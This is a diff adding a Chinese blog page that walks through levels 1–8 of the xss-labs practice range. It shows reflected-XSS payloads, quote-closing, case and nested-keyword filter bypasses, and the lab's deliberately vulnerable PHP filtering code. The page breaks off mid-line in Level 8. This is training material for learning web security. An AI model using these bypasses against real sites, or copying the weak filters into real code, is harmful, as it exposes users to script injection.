@@ -1,0 +1,756 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"greatchu-adhereno.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="一个简单的xss注入靶场解题步骤">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss-labs">
+<meta property="og:url" content="http://greatchu-adhereno.top/2023/09/09/xss-labs/index.html">
+<meta property="og:site_name" content="毕竟留了一手的博客">
+<meta property="og:description" content="一个简单的xss注入靶场解题步骤">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://test.ctf8.com/index.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/07/23/10de141836dc809b3a421601ca0a32d9-image-20230723224012449-d8402c.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/08/07/ba0593442bc77f928553269aae214a16-image-20230807182629618-4739e4.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/08/10/c433fcd211a09ed0b8de49e5f8ddc19a-image-20230810220945625-85ebd1.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/08/10/46a27660b2343c064517dfd932b9c0bf-image-20230810221004766-f1e0d1.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/08/07/25861d5d134958c76953f1e1a52db575-image-20230807182820000-39d2a6.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/08/07/351b94d9ace192942bc64c1365cf417c-image-20230807182838047-16884e.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/08/07/b694623456ea84e07232f968b307ed6c-image-20230807183001226-381862.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/08/07/7315084e096f2ab85a91e0237443681b-image-20230807183059654-d5aae9.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/08/25/c663e185f503970dd4149803245cc337-image-20230825231823810-eb1e26.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/08/25/ba26bb007410e2d4a3794cfaa65f61db-image-20230825232143124-3dcffa.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/08/25/7f7d7a2929c569bb84d7be5f169138ad-image-20230825232543963-8be874.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/09/05/092b5d9058e68045402e702733e0d6e1-image-20230905075546572-7cad90.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/0oxyixiaoo0/Image@main/md/2023/09/05/84db365701d1c8141adf61c3e637e61b-image-20230905080846085-ccf7fc.png">
+<meta property="article:published_time" content="2023-09-09T08:16:51.000Z">
+<meta property="article:modified_time" content="2023-09-09T09:21:47.134Z">
+<meta property="article:author" content="毕竟留了一手">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="靶场">
+<meta property="article:tag" content="BurpSuite">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://test.ctf8.com/index.png">
+
+<link rel="canonical" href="http://greatchu-adhereno.top/2023/09/09/xss-labs/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>xss-labs | 毕竟留了一手的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">毕竟留了一手的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://greatchu-adhereno.top/2023/09/09/xss-labs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="毕竟留了一手">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="毕竟留了一手的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          xss-labs
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-09-09 16:16:51 / 修改时间：17:21:47" itemprop="dateCreated datePublished" datetime="2023-09-09T16:16:51+08:00">2023-09-09</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">一个简单的xss注入靶场解题步骤</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><img src="http://test.ctf8.com/index.png"></p>
+<blockquote>
+<p>项目地址:<a target="_blank" rel="noopener" href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a></p>
+<p>靶场链接: <a target="_blank" rel="noopener" href="http://test.ctf8.com/">http://test.ctf8.com/</a></p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h1><p>无过滤，也不需要闭合，直接注入即可</p>
+<p>输入:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h1><p>输入level 1中payload返回的HTML局部源码为：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span>没有找到和<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert()<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;level2.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;keyword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;script&gt;alert()&lt;/script&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看出 h2标签将&lt; &gt;转换为了<strong>HTML实体编码</strong> 而value属性没有转换</p>
+<p>查看php源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>其中函数htmlspecialchars()的作用是将特定字符(&lt;、&gt;等)转换为HTML字符实体，<em>默认情况下htmlspecialchars()仅编码双引号</em></p>
+<blockquote>
+<p><strong>HTML字符实体</strong> 可以显示特定字符（例如&lt; &gt;等）同时又不会被浏览器解析为HTML语句</p>
+</blockquote>
+<p>尝试闭合value 属性处的引号 并注入语句</p>
+<p>输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h1><p>同level2一样输入，返回的HTML局部源码为:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span>没有找到和&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert()<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;keyword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;quot;</span>&gt;&lt;script&gt;alert()&lt;/script&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看出value属性中的“也被转换成实体编码了，将”改为’试试:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;keyword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> &amp;<span class="attr">gt</span>;&amp;<span class="attr">lt</span>;<span class="attr">script</span>&amp;<span class="attr">gt</span>;<span class="attr">alert</span>()&amp;<span class="attr">lt</span>;=<span class="string">&quot;&quot;</span> <span class="attr">script</span>&amp;<span class="attr">gt</span>;&#x27;=<span class="string">&quot;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以尝试构建 onfoucs属性 ，输入</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; onclick=&#x27;alert(1)</span><br></pre></td></tr></table></figure>
+
+<p>此时的HTML:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;keyword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h1><p>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; onclick=&#x27;alert(1)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>HTML元素:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;keyword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&#x27; onclick=&#x27;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>与Level 3不同，该题需要对双引号“”进行闭合</p>
+<p>输入:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+
+<p>闭合后元素为：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;keyword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&#x27; onclick=&#x27;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>该题php源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>该题过滤直接将&lt; 和 &gt; 删掉，但并没有转换引号</p>
+<h1 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h1><p>和Level4一样操作 发现该题过滤掉了onclick：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;keyword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">o_nclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>尝试其他标签或语句：</p>
+<ul>
+<li><p>&lt;script&gt;:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;keyword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;scr_ipt&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>onerror(等一系列on开头的属性) :</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;keyword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;o_nerror&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>javascript :</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;keyword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;javascript:alert()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>javascript未被过滤，构造javascript相关的代码即可</p>
+<p>输入:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; &gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert()</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&lt;&quot;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>html中的a标签为超链接标签，可以将javascript:alert()赋值给href</p>
+</blockquote>
+<p>返回：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;keyword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert()&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>可以进行XSS注入（触发javascript脚本）的地方为：</p>
+<ol>
+<li>&lt;script&gt;标签直接注入</li>
+<li>onclick,onerror等<strong>事件属性</strong></li>
+<li>scr,href等<strong>资源属性</strong></li>
+</ol>
+<h1 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h1><p>同Level5一样尝试各种标签以及属性后可知script,href,scr,on__等标签都被过滤</p>
+<p>但是 该题只对小写标签进行了过滤，可以<strong>利用大小写绕过过滤</strong></p>
+<p>输入：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">SCript</span>&gt;</span>alert()<span class="tag">&lt;/<span class="name">sCript</span>&gt;</span>&lt;&quot;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h1><p>实验&lt;script&gt;标签得：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;keyword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>判断该题过滤方法为直接删除过滤字，因此可以尝试使用<strong>嵌套绕过过滤</strong></p>
+<p>输入:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">sscriptcript</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">sscriptcript</span>&gt;</span>  //s*script*cript 中删除一个script后 返回的字符串为script</span><br></pre></td></tr></table></figure>
+
+<p>实现该过滤方法的php源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> =<span class="title function_ invoke__">strtolower</span>( <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]); <span class="comment">//将字符串全转换为小写 防止被大小写绕过过滤</span></span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str5</span>);<span class="comment">//依次将 script  on  src  data href等标签去除</span></span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&#x27;.<span class="subst">$str6</span>.&#x27;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h1><p>试验”&gt;&lt;script&gt;与’&gt;&lt;script&gt;分别返回:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;keyword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;quot;</span>&gt;&lt;script&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;keyword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#x27;&gt;&lt;script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试构造onclick:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;keyword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#x27;onclick=&#x27;alert(1)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;keyword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;quot;</span>onclick=<span class="symbol">&amp;quot;</span>alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试构造href:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;keyword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;javascript:alert()&quot;</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascr_ipt:alert()&quot;</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>该题value将””转为了实体编码 因而无法闭合，然而href属性可以直接注入 不需要使用”进行闭合</p>
+<p>过滤相关源码如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line">....</span><br><span class="line">&lt;input name=keyword  